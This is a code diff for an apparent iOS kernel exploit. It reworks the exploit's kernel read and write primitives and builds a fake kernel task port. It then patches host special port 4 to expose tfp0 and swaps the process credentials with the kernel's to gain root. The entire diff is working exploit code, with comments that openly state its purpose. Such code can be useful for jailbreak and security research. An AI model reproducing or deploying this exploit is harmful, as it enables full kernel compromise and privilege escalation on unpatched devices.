@@ -291,16 +291,70 @@ static kern_return_t send_port(mach_port_t rcv, mach_port_t myP)
     return err;
 }
 
-// ********** ********** ********** ye olde pwnage ********** ********** **********
+uint64_t kalloc(mach_port_t the_one, uint64_t size)
+{
+    kern_return_t ret;
+    mach_vm_address_t addr; 
 
-kern_return_t   (^kcall)            (uint64_t, int, ...);
-void            (^kreadbuf)         (uint64_t, void *, size_t);
-uint32_t        (^kread32)          (uint64_t);
-uint64_t        (^kread64)          (uint64_t);
-void            (^kwritebuf)        (uint64_t, void *, size_t);
-void            (^kwrite32)         (uint64_t, uint32_t);
-void            (^kwrite64)         (uint64_t, uint64_t);
-uint64_t        (^zonemap_fix_addr) (uint64_t);
+    ret = mach_vm_allocate(the_one, (mach_vm_address_t *)&addr, (mach_vm_size_t)size, VM_FLAGS_ANYWHERE);
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to call mach_vm_allocate(0x%llx): %x %s", size, ret, mach_error_string(ret));
+        return (uint64_t)0x0;
+    }
+
+    return (uint64_t)addr;
+}
+
+void kread(mach_port_t port, uint64_t addr, void *buf, size_t size)
+{
+    kern_return_t ret;
+    size_t offset = 0;
+
+    while (offset < size) 
+    {
+        mach_vm_size_t sz, chunk = 0xfff;
+        if (chunk > size - offset) 
+        {
+            chunk = size - offset;
+        }
+        
+        ret = mach_vm_read_overwrite(port, addr + offset, chunk, (mach_vm_address_t)buf + offset, &sz);
+        if (ret != KERN_SUCCESS || 
+            sz == 0) {
+            LOG("failed to call mach_vm_read_overwrite (%llx): %x %s", addr, ret, mach_error_string(ret));
+            break;
+        }
+
+        offset += sz;
+    }
+}
+
+uint64_t kread64(mach_port_t port, uint64_t addr)
+{
+    uint64_t val = 0x0;
+    kread(port, addr, (void *)&val, sizeof(val));
+    return val;
+}
+
+void kwrite(mach_port_t port, uint64_t addr, void *buf, size_t len)
+{
+    kern_return_t ret;
+
+    ret = mach_vm_write(port, addr, (vm_offset_t)buf, len);
+
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to call mach_vm_write(0x%llx, 0x%p, 0x%zx): %x %s", addr, buf, len, ret, mach_error_string(ret));
+    }
+}
+
+void kwrite64(mach_port_t port, uint64_t addr, uint64_t val)
+{
+    kwrite(port, addr, &val, sizeof(val));
+}
+
+// ********** ********** ********** ye olde pwnage ********** ********** **********
 
 kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_back)
 {
@@ -541,8 +595,6 @@ kern_return_t exploit(offsets_t *offsets, task_t *tfp0_back, uint64_t *kbase_bac
     
     mach_port_t the_one = real_port_to_fake_voucher;
     
-    // uint64_t textbase = offsets->data.system_clock;
-
     /* set our fakeport back to a TASK port and setup arbitrary read via pid_for_task */
     fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
     
@@ -722,6 +774,64 @@ value = value | ((uint64_t)read64_tmp << 32)
     }
     LOG("read kernel base value: %x", kbase_value);
 
+    /* find realhost */
+    ret = send_port(the_one, mach_host_self());
+    if (ret != KERN_SUCCESS)
+    {
+        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
+        goto out;
+    }
+    
+    ikmq_base = fakeport->ip_messages.port.messages;
+    if (ikmq_base == 0x0)
+    {
+        LOG("failed to find ikmq_base!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("got ikmq_base: 0x%llx", ikmq_base);
+
+    /* since this is the 2nd message we've sent to this port, our msg will lie in ipc_kmsg->next */
+    uint64_t ikm_next = 0x0;
+    rk64(ikmq_base + 0x8, ikm_next);
+    if (ikm_next == 0x0)
+    {
+        LOG("failed to find ikm_next!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("ikm_next: 0x%llx", ikm_next);
+
+    ikm_header = 0x0;
+    rk64(ikm_next + 0x18, ikm_header);
+    if (ikm_header == 0x0)
+    {
+        LOG("failed to find ikm_header!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("ikm_header: 0x%llx", ikm_header);
+
+    port_addr = 0x0;
+    rk64(ikm_header + 0x24, port_addr);
+    if (port_addr == 0x0)
+    {
+        LOG("failed to find port_addr!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("port_addr: 0x%llx", port_addr);
+
+    uint64_t realhost = 0x0;
+    rk64(port_addr + offsetof(kport_t, ip_kobject), realhost);
+    if (realhost == 0x0)
+    {
+        LOG("failed to find realhost!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("realhost: 0x%llx", realhost);
+
     uint64_t ourproc = 0x0;
     rk64(ourtask + offsets->struct_offsets.task_bsd_info, ourproc);
     LOG("got ourproc: 0x%llx", ourproc);
@@ -754,189 +864,70 @@ value = value | ((uint64_t)read64_tmp << 32)
 
     LOG("got kernproc: 0x%llx", kernproc);
 
-    /* copy out vtable into userland */
-    
-    uint64_t *iosurface_vtab = (uint64_t *)malloc(0xC0 * sizeof(uint64_t));
-    LOG("iosurface_vtab: 0x%llx", (uint64_t)iosurface_vtab);
-    
-    for (int i = 0; i < 0xC0; i++)
+    uint64_t kerntask = 0x0;
+    rk64(kernproc + offsets->struct_offsets.proc_task, kerntask);
+    if (kerntask == 0x0)
     {
-        uint64_t vtab_entry = 0x0;
-        rk64(iosruc_vtab + (i * sizeof(uint64_t)), vtab_entry);
-        iosurface_vtab[i] = vtab_entry;
-    }
-    
-    /* patch getExternalTrapForIndex */
-    iosurface_vtab[offsets->iosurface.get_external_trap_for_index] = offsets->funcs.csblob_get_cdhash + kslide;
-    
-    uint64_t *iosurface_client = (uint64_t *)malloc(0x200 * sizeof(uint64_t));
-    LOG("iosurface_client: 0x%llx", (uint64_t)iosurface_client);
-    
-    /* copy out client into userland */
-    for (int i = 0; i < 0x200; i++)
-    {
-        uint64_t client_entry = 0x0;
-        rk64(iosruc_addr + (i * sizeof(uint64_t)), client_entry);
-        iosurface_client[i] = client_entry;
-    }
-    
-    /* set client vtab to our fake vtab */
-    *(uint64_t *)iosurface_client = (uint64_t)iosurface_vtab;
-    
-    /* set our fakeport back to an IOKit/UC port */
-    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
-    fakeport->ip_kobject = (uint64_t)iosurface_client;
-    
-    /* define functions for kcall, kread, kwrite, based on our kcall primitive */
-    kcall = ^(uint64_t addr, int n_args, ...)
-    {
-        if (n_args > 7)
-        {
-            LOG("no more than 7 args you cheeky fuck: 0x%llx %d", addr, n_args);
-            return KERN_INVALID_ARGUMENT;
-        }
-        
-        va_list ap;
-        va_start(ap, n_args);
-        
-        uint64_t args[7] = { 0 };
-        for (int i = 0; i < n_args; i++)
-        {
-            args[i] = va_arg(ap, uint64_t);
-        }
-        
-        if (n_args == 0 ||
-            args[0] == 0x0)
-        {
-            args[0] = 0x1;
-        }
-        
-        *(uint64_t *)((uint64_t)iosurface_client + 0x40) = args[0];
-        *(uint64_t *)((uint64_t)iosurface_client + 0x48) = addr + kslide;
-        
-        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
-    };
-    
-    /* 
-        call the `add x0, x0, #0x40; ret` gadget with x0=0x20 to ensure our 
-        primitive is working. this should return the result 0x60 (0x20+0x40)
-    */
-    uint32_t kcall_ret = kcall(offsets->funcs.csblob_get_cdhash, 1, 0x20);
-    if (kcall_ret != 0x60)
-    {
-        LOG("kcall failed: %x", kcall_ret);
+        LOG("failed to find kerntask!");
         ret = KERN_FAILURE;
         goto out;
     }
-    
-    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
-    {
-        kcall(offsets->funcs.copyout, 3, addr, buf, len);
-    };
-    
-    kread32 = ^(uint64_t addr)
-    {
-        uint32_t val = 0;
-        kreadbuf(addr, &val, sizeof(val));
-        return val;
-    };
-    
-    kread64 = ^(uint64_t addr)
-    {
-        uint64_t val = 0;
-        kreadbuf(addr, &val, sizeof(val));
-        return val;
-    };
-    
-    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
-    {
-        kcall(offsets->funcs.copyin, 3, buf, addr, len);
-    };
-    
-    kwrite32 = ^(uint64_t addr, uint32_t val)
-    {
-        kwritebuf(addr, &val, sizeof(val));
-    };
-    
-    kwrite64 = ^(uint64_t addr, uint64_t val)
-    {
-        kwritebuf(addr, &val, sizeof(val));
-    };
-    
-    /* no longer needed */
-#undef rk32
-#undef rk64
-
-    LOG("kernel base read: 0x%llx", kread64(offsets->constant.kernel_image_base + kslide));
-    LOG("kernel base read: 0x%llx", kread64(offsets->constant.kernel_image_base + kslide + 0x8));
-    
-    /* 
-        our kcall primitive can only return a 32-bit integer, so for 
-        64bit values we will need to look for them in the zonemap 
-    */
-
-    uint64_t zone_map_addr = kread64(offsets->data.zonemap + kslide);
-    
-    LOG("zone map: 0x%llx", zone_map_addr);
-    
-    typedef struct
-    {
-        uint64_t prev;
-        uint64_t next;
-        uint64_t start;
-        uint64_t end;
-    } kmap_hdr_t;
-    
-    kmap_hdr_t zm_hdr = { 0 };
-    
-    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
-    
-    LOG("zone start: 0x%llx", zm_hdr.start);
-    LOG("zone end: 0x%llx", zm_hdr.end);
-    
-    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
-    LOG("zm_size: 0x%llx", zm_size);
-    
-    if (zm_size > 0x100000000)
-    {
-        LOG("zonemap too big");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-    
-    zonemap_fix_addr = ^(uint64_t addr)
-    {
-        uint64_t spelunk = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
-        return spelunk < zm_hdr.start ? spelunk + 0x100000000 : spelunk;
-    };
-    
-    /* kernproc->task->vm_map */
-
-    uint64_t kerntask = kread64(kernproc + offsets->struct_offsets.proc_task);
     LOG("got kerntask: 0x%llx", kerntask);
 
-    uint64_t kernel_vm_map = kread64(kerntask + offsets->struct_offsets.task_vm_map);
-    LOG("kernel_vm_map: 0x%llx", kernel_vm_map);
+    uint64_t kernel_vm_map = 0x0;
+    rk64(kerntask + offsets->struct_offsets.task_vm_map, kernel_vm_map);
+    if (kernel_vm_map == 0x0)
+    {
+        LOG("failed to find kernel_vm_map!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("got kernel vm map: 0x%llx", kernel_vm_map);
+
+    fake_task->lock.data = 0x0;
+    fake_task->lock.type = 0x22;
+    fake_task->ref_count = 100;
+    fake_task->active = 1;
+    fake_task->map = kernel_vm_map;
+    *(uint32_t *)((uint64_t)fake_task + offsets->struct_offsets.task_itk_self) = 1;
 
     /* 
-        build a shitty tfp0 
-    */
+        since our IOSurfaceRoot userclient is owned by kernel, the 
+        ip_receiver field will point to kernel's ipc space 
+    */ 
+    uint64_t ipc_space_kernel = 0x0;
+    rk64(iosruc_port + offsetof(kport_t, ip_receiver), ipc_space_kernel);
+    LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);
 
-    /* allocate a buffer for the fake task in kernel */
-    uint64_t fake_task_k = zonemap_fix_addr(kcall(offsets->funcs.kalloc_external, 1, 0x600));
+    /* as soon as we modify our fakeport, we don't want to be using our old rw gadgets */
+#undef rk64
+#undef rk32
 
-    // kwrite64(new_port + offsetof(kport_t, ip_kobject), fake_task_k);
+    fakeport->ip_receiver = ipc_space_kernel;
 
-    /* build the task in userland */
-    ktask_t *userland_task = (ktask_t *)malloc(0x600);
-    bzero((void *)userland_task, 0x600);
-    
-    userland_task->lock.data = 0x0;
-    userland_task->lock.type = 0x22;
-    userland_task->ref_count = 100;
-    userland_task->active = 1;
-    userland_task->map = kernel_vm_map;
-    *(uint32_t *)((uint64_t)userland_task + offsets->struct_offsets.task_itk_self) = 1;
+    /* the_one should now have access to kernel mem */
+
+    uint64_t kbase_data = kread64(the_one, kernel_base);
+
+    if ((uint32_t)kbase_data != MH_MAGIC_64)
+    {
+        LOG("full kernel read via the_one failed!");
+        ret = KERN_FAILURE;
+        goto out; 
+    }
+
+    LOG("got kernel base: %llx", kbase_data);
+
+    /* allocate kernel task */
+
+    uint64_t kernel_task_buf = kalloc(the_one, 0x600);
+    if (kernel_task_buf == 0x0)
+    {
+        LOG("failed to allocate kernel_task_buf!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("kernel_task_buf: 0x%llx", kernel_task_buf);
 
     /* 
         task_info TASK_DYLD_INFO patch 
@@ -944,99 +935,54 @@ value = value | ((uint64_t)read64_tmp << 32)
         API, and retreive some data from the kernel's task struct
         we use it for storing the kernel base and kernel slide values 
     */ 
-    *(uint64_t *)((uint64_t)userland_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
-    *(uint64_t *)((uint64_t)userland_task + offsets->struct_offsets.task_all_image_info_size) = kslide;
+    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_addr) = kernel_base;
+    *(uint64_t *)((uint64_t)fake_task + offsets->struct_offsets.task_all_image_info_size) = kslide;
 
-    /* copy it onto our buffer */
-    kwritebuf(fake_task_k, (void *)userland_task, 0x600);
+    kwrite(the_one, kernel_task_buf, (void *)fake_task, 0x600);
 
-    free((void *)userland_task);
-
-    /* 
-        since our IOSurfaceRoot userclient is owned by kernel, the 
-        ip_receiver field will point to kernel's ipc space 
-    */ 
-    uint64_t ipc_space_kernel = kread64(iosruc_port + offsetof(kport_t, ip_receiver));
-    LOG("ipc_space_kernel: 0x%llx", ipc_space_kernel);
-
-    /* allocate a buffer for our fake kernel task port */
-    uint64_t new_port = zonemap_fix_addr(kcall(offsets->funcs.kalloc_external, 1, 0x300));
-
-    /* build our fake port struct */
-    kport_t *uland_port = (kport_t *)malloc(0x300);
-    bzero((void *)uland_port, 0x300);
-
-    uland_port->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
-    uland_port->ip_references = 0xf00d;
-    uland_port->ip_srights = 0xf00d;
-    uland_port->ip_receiver = ipc_space_kernel;
-    uland_port->ip_context = 0x1234;
-    uland_port->ip_kobject = fake_task_k;
-    
-    /* copy it onto the port we just allocated */
-    kwritebuf(new_port, (void *)uland_port, 0x300);
-
-    free((void *)uland_port);
-    
-    /* find realhost */
-    ret = send_port(the_one, mach_host_self());
-    if (ret != KERN_SUCCESS)
+    /* allocate kernel port */
+    uint64_t kernel_port_buf = kalloc(the_one, 0x300);
+    if (kernel_port_buf == 0x0)
     {
-        LOG("failed to send_port: %x %s", ret, mach_error_string(ret));
-        goto out;
-    }
-    
-    /* since this is the 2nd message we've sent to this port, our msg will lie in ipc_kmsg->next */
-    uint64_t ikm_next = kread64(ikmq_base + 0x8);
-    if (ikm_next == 0x0)
-    {
-        LOG("failed to find ikm_next!");
+        LOG("failed to allocate kernel_port_buf!");
         ret = KERN_FAILURE;
         goto out;
     }
-    LOG("ikm_next: 0x%llx", ikm_next);
+    LOG("kernel_port_buf: 0x%llx", kernel_port_buf);
 
-    ikm_header = kread64(ikm_next + 0x18);
-    if (ikm_header == 0x0)
-    {
-        LOG("failed to find ikm_header!");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-    LOG("ikm_header: 0x%llx", ikm_header);
+    fakeport->ip_kobject = kernel_task_buf;
 
-    port_addr = kread64(ikm_header + 0x24);
-    if (port_addr == 0x0)
-    {
-        LOG("failed to find port_addr!");
-        ret = KERN_FAILURE;
-        goto out;
-    }
-    LOG("port_addr: 0x%llx", port_addr);
-
-    uint64_t realhost = kread64(port_addr + offsetof(kport_t, ip_kobject));
-    if (realhost == 0x0)
-    {
-        LOG("failed to find realhost!");
-        ret = KERN_FAILURE;
-        goto out;
-    }
+    kwrite(the_one, kernel_port_buf, (void *)fakeport, 0x300);
 
     /*
         host_get_special_port(4) patch
         allows the kernel task port to be accessed by any root process 
     */
-    kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
+    kwrite64(the_one, realhost + 0x10 + (sizeof(uint64_t) * 4), kernel_port_buf);
 
     /* eleveate creds to kernel */
     
     int orig_uid = getuid();
 
-    uint64_t orig_ucred = kread64(ourproc + offsets->struct_offsets.proc_ucred);
+    uint64_t orig_ucred = kread64(the_one, ourproc + offsets->struct_offsets.proc_ucred);
+    if (orig_ucred == 0x0)
+    {
+        LOG("failed to get orig_ucred!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
     LOG("orig_ucred: 0x%llx", orig_ucred);
 
-    uint64_t kern_ucred = kread64(kernproc + offsets->struct_offsets.proc_ucred);
-    kwrite64(ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
+    uint64_t kern_ucred = kread64(the_one, kernproc + offsets->struct_offsets.proc_ucred);
+    if (kern_ucred == 0x0)
+    {
+        LOG("failed to get kern_ucred!");
+        ret = KERN_FAILURE;
+        goto out;
+    }
+    LOG("kern_ucred: 0x%llx", kern_ucred);
+    
+    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, kern_ucred);
     
     LOG("setuid: %d, uid: %d", setuid(0), getuid());
     if (getuid() != 0)
@@ -1050,6 +996,8 @@ value = value | ((uint64_t)read64_tmp << 32)
     ret = host_get_special_port(mach_host_self(), HOST_LOCAL_NODE, 4, &hsp4);
     
     /* de-elevate */
+
+    kwrite64(the_one, ourproc + offsets->struct_offsets.proc_ucred, orig_ucred);
 
     LOG("setuid: %d, uid: %d", setuid(orig_uid), getuid());
     if (getuid() != orig_uid)
@@ -1067,19 +1015,13 @@ value = value | ((uint64_t)read64_tmp << 32)
     }
 
     /* test it */
-    vm_offset_t data_out = 0x0;
-    mach_msg_type_number_t out_size = 0x0;
-    ret = mach_vm_read(hsp4, kernel_base, 0x20, &data_out, &out_size);
-    if (ret != KERN_SUCCESS)
+    kbase_value = kread64(hsp4, kernel_base);
+    if ((uint32_t)kbase_value != MH_MAGIC_64)
     {
-        printf("failed read on kern base via tfp0: %x (%s)\n", ret, mach_error_string(ret));
+        LOG("failed to read from kernel base & test hsp4!");
+        ret = KERN_FAILURE;
         goto out;
     }
-
-    /* we're done! */
-    LOG("tfp0 achieved!");
-    LOG("base: 0x%llx", *(uint64_t *)data_out);
-    LOG("Success!");
 
     *tfp0_back = hsp4;
     *kbase_back = kernel_base;
